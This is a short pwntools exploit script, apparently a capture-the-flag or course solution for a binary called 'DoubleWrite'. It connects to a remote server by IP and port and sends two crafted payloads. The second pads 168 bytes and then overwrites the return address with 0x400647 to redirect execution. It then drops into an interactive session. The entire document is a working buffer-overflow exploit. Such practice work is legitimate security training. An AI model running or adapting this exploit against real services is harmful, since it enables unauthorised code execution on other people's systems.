#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

local = False
elf = 'DoubleWrite' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "140.114.77.172"
    port = 10000
    r = remote(ip,port)

context.arch = 'amd64'


addr = 0x400647
payload1 = '\x00' * 156 + '\xaf'
payload2 = 'a' * 168 + p64(addr)
raw_input('aa')
print payload1
print payload2

r.send(payload1)
r.send(payload2)
r.interactive()
